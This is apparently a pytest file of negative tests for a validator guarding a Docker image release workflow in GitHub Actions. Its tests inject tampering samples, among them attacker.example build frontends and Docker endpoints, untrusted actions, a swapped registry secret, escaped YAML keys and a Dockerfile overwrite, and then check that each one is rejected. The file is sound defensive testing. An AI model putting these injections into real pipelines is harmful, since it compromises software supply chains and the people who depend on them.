"""Negative checks for Docker frontend selection at the release boundary."""

from pathlib import Path

import pytest

from scripts.validate_image_supply_chain import validate_ci_image_release_workflow

pytestmark = pytest.mark.governance


def test_image_release_contract_rejects_buildkit_syntax_build_argument(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          build-args: |\n",
            "          build-args: |\n"
            "            BUILDKIT_SYNTAX=attacker.example/dockerfile:latest\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: reserved BUILDKIT_SYNTAX frontend override is forbidden" in issues
    assert f"{workflow_path}: release build arguments must match the approved contract" in issues


def test_image_release_contract_rejects_dynamic_build_arguments(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          build-args: |\n",
            "          build-args: |\n            ${{ vars.EXTRA_BUILD_ARGS }}\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release build arguments must match the approved contract" in issues


def test_image_release_contract_rejects_second_build_action(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Prepare image release evidence directory\n"
    second_build = (
        "      - name: Replace validated image\n"
        "        uses: docker/build-push-action@v7\n"
        "        with:\n"
        "          context: .\n"
        "          file: Dockerfile\n"
        "          target: builder\n"
        "          load: true\n"
        "          tags: ${{ env.IMAGE_NAME }}:${{ github.sha }}\n\n"
    )
    workflow_path.write_text(
        current.replace(marker, second_build + marker, 1),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert (
        f"{workflow_path}: release workflow must contain exactly one approved Docker build action"
        in issues
    )


def test_image_release_contract_rejects_direct_local_tag_mutation(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Prepare image release evidence directory\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Replace validated tag\n"
            "        run: docker tag attacker/image:latest "
            "${{ env.IMAGE_NAME }}:${{ github.sha }}\n\n" + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert (
        f"{workflow_path}: release workflow must not mutate the validated local image tag" in issues
    )


def test_image_release_contract_rejects_shell_indirected_pre_scan_build(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Prepare image release evidence directory\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Replace image through shell indirection\n"
            "        run: |\n"
            "          cli=docker\n"
            '          "$cli" build --target builder '
            '-t "${IMAGE_NAME}:${GITHUB_SHA}" .\n\n' + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


def test_image_release_contract_rejects_shell_indirection_before_push(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = '          push_output="$(docker push "$image_ref" 2>&1)"\n'
    workflow_path.write_text(
        current.replace(
            marker,
            "          cli=docker\n"
            '          "$cli" build --target builder -t attacker/image:latest .\n'
            '          "$cli" tag attacker/image:latest "$image_ref"\n' + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: publication script must match the approved contract" in issues


def test_image_release_contract_rejects_action_inserted_after_scans(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Authenticate to release registry\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Replace Docker through the runner path\n"
            "        uses: attacker.example/release-action@v1\n\n" + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


def test_image_release_contract_rejects_action_inserted_before_final_scan(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Vulnerability scan\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - uses: attacker.example/release-action@v1\n\n" + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


def test_image_release_contract_rejects_source_rewrite_after_validation(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Resolve build timestamp\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Remove validated runtime guards\n"
            "        run: sed -i 's#/usr/local/bin/python3.12 -I -S#true#g' Dockerfile\n\n"
            + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


def test_image_release_contract_rejects_path_poisoning_before_validation(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Validate image supply-chain contract\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Poison validation command resolution\n"
            "        uses: attacker.example/path-action@v1\n\n" + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


def test_image_release_contract_locks_registry_authentication(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          password: ${{ secrets.GITHUB_TOKEN }}\n",
            "          password: ${{ secrets.ATTACKER_TOKEN }}\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: registry authentication must match the approved contract" in issues


def test_image_release_contract_rejects_remote_buildx_driver(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "      - uses: docker/setup-buildx-action@v4\n",
            "      - uses: docker/setup-buildx-action@v4\n"
            "        with:\n"
            "          driver: remote\n"
            "          endpoint: tcp://attacker.example:1234\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: Buildx setup step must match the approved local contract" in issues


def test_image_release_contract_rejects_alternate_checkout_source(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "      - uses: actions/checkout@v6\n",
            "      - uses: actions/checkout@v6\n"
            "        with:\n"
            "          repository: attacker/example\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: checkout step must match the approved contract" in issues


def test_image_release_contract_rejects_alternate_buildx_builder(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          context: .\n",
            "          builder: attacker-controlled\n          context: .\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert (
        f"{workflow_path}: release build must use context ., the validated root Dockerfile, "
        "and runtime target" in issues
    )


@pytest.mark.parametrize("override", ["DOCKER_HOST", "DOCKER_CONTEXT", "BUILDX_BUILDER"])
def test_image_release_contract_rejects_ambient_docker_endpoint_override(
    tmp_path: Path,
    override: str,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "  IMAGE_NAME: ghcr.io/${{ github.repository }}\n",
            "  IMAGE_NAME: ghcr.io/${{ github.repository }}\n"
            f"  {override}: tcp://attacker.example:2375\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: ambient Docker endpoint overrides are forbidden: {override}" in issues


def test_image_release_contract_rejects_conditional_sbom_generation(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "      - name: Generate SBOM\n",
            "      - name: Generate SBOM\n        if: false\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: SBOM must use the validated immutable local image ID" in issues


def test_image_release_contract_rejects_pre_checkout_environment_mutation(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - uses: actions/checkout@v6\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Persist alternate daemon endpoint\n"
            '        run: echo "${ENDPOINT_KEY}=tcp://attacker.example:2375" >> "$GITHUB_ENV"\n\n'
            + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


def test_image_release_contract_rejects_custom_job_shell(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n"
            "    defaults:\n"
            "      run:\n"
            "        shell: ./attacker-shell {0}\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: custom job or step execution context is forbidden" in issues


def test_image_release_contract_rejects_workflow_default_shell(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "permissions:\n",
            "defaults:\n"
            "  run:\n"
            '    shell: "python .github/workflow-shell.py {0}"\n\n'
            "permissions:\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: custom job or step execution context is forbidden" in issues
    assert f"{workflow_path}: workflow header must match the approved contract" in issues


def test_image_release_contract_rejects_escaped_conditional_key(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            '          exit-code: "1"\n',
            '          exit-code: "1"\n        "\\x69f": false\n',
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert any(
        issue.endswith("contains decoded YAML fields that are not plain declared keys: if")
        for issue in issues
    )


def test_image_release_contract_rejects_escaped_action_with_nested_decoy(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "        uses: docker/build-push-action@v7\n        with:\n",
            '        "\\x75ses": evil-org/release-action@v1\n'
            "        with:\n"
            "          uses: docker/build-push-action@v7\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert any(
        issue.endswith("contains decoded YAML fields that are not plain declared keys: uses")
        for issue in issues
    )


def test_image_release_contract_rejects_duplicate_decoded_key(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          target: runtime\n",
            "          target: runtime\n          target: builder\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: duplicate decoded YAML mapping keys are forbidden: target" in issues


def test_image_release_contract_rejects_job_condition(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    if: false\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release job header must match the approved contract" in issues


def test_image_release_contract_rejects_escaped_job_condition_after_steps(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current + '    "\\x69f": false\n',
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: decoded release job fields must match the approved contract" in issues


def test_image_release_contract_rejects_permission_change(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace("  packages: write\n", "  packages: read\n", 1),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: workflow permissions must match the approved contract" in issues


def test_image_release_contract_rejects_shell_startup_environment(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "env:\n",
            "env:\n  BASH_ENV: .github/workflow-env.sh\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: workflow environment must match the approved contract" in issues


def test_image_release_contract_rejects_additional_privileged_job(tmp_path: Path) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current
        + "\n  replace-image:\n"
        + "    needs: release-image\n"
        + "    runs-on: ubuntu-24.04\n"
        + "    steps:\n"
        + "      - uses: attacker.example/release-action@v1\n",
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release-image must be the workflow's only job" in issues


@pytest.mark.parametrize("quote", ['"', "'"])
def test_image_release_contract_rejects_quoted_additional_privileged_job(
    tmp_path: Path,
    quote: str,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current
        + f"\n  {quote}replace-image{quote}:\n"
        + "    needs: release-image\n"
        + "    runs-on: ubuntu-24.04\n"
        + "    steps:\n"
        + "      - uses: attacker.example/release-action@v1\n",
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release-image must be the workflow's only job" in issues


def test_image_release_contract_rejects_escaped_additional_privileged_job(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current
        + '\n  "replace\\u002dimage":\n'
        + '    "\\u006eeeds": release-image\n'
        + "    uses: attacker/example/.github/workflows/overwrite.yml@main\n",
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: decoded release-image must be the workflow's only job" in issues


def test_image_release_contract_rejects_action_inserted_after_cosign_setup(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    marker = "      - name: Sign image by digest\n"
    workflow_path.write_text(
        current.replace(
            marker,
            "      - name: Poison signing command resolution\n"
            "        uses: attacker.example/path-action@v1\n\n" + marker,
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert f"{workflow_path}: release steps must match the approved contract" in issues


@pytest.mark.parametrize(
    ("current_input", "alternate_input"),
    [
        ("          context: .\n", "          context: ./alternate-context\n"),
        ("          file: Dockerfile\n", "          file: Dockerfile.unchecked\n"),
        ("          target: runtime\n", "          target: builder\n"),
    ],
)
def test_image_release_contract_rejects_alternate_build_source(
    tmp_path: Path,
    current_input: str,
    alternate_input: str,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(current_input, alternate_input, 1),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert (
        f"{workflow_path}: release build must use context ., the validated root Dockerfile, "
        "and runtime target" in issues
    )


def test_image_release_contract_rejects_checkout_backend_before_validation(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          python -m pip install PyYAML==6.0.3\n"
            "          python -P scripts/validate_image_supply_chain.py\n",
            '          pip install -e ".[dev]"\n          make image-supply-chain-gate\n',
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert (
        f"{workflow_path}: supply-chain validation step must match the approved contract" in issues
    )


def test_image_release_contract_rejects_command_after_literal_block_blank_line(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "image-release.yml"
    current = Path(".github/workflows/image-release.yml").read_text(encoding="utf-8")
    workflow_path.write_text(
        current.replace(
            "          python -P scripts/validate_image_supply_chain.py\n",
            "          python -P scripts/validate_image_supply_chain.py\n"
            "\n"
            "          python -c \"open('Dockerfile', 'w').write('FROM scratch')\"\n",
            1,
        ),
        encoding="utf-8",
    )

    issues = validate_ci_image_release_workflow(workflow_path)

    assert (
        f"{workflow_path}: supply-chain validation step must match the approved contract" in issues
    )
